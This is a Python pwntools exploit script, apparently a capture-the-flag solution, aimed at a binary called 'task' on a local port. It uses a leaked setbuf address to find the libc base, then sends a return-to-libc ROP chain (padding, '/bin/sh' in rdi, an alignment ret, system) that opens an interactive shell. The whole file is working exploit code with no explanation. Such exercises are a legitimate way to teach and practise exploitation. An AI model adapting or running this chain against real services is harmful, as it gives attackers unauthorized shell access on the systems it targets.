#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

leak = int(p.readline().decode(), 16)
libc.address = leak - libc.sym["setbuf"]

rop = ROP(libc)
rop.raw(b"A" * 0x88)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.sendline(rop.chain())

p.interactive()
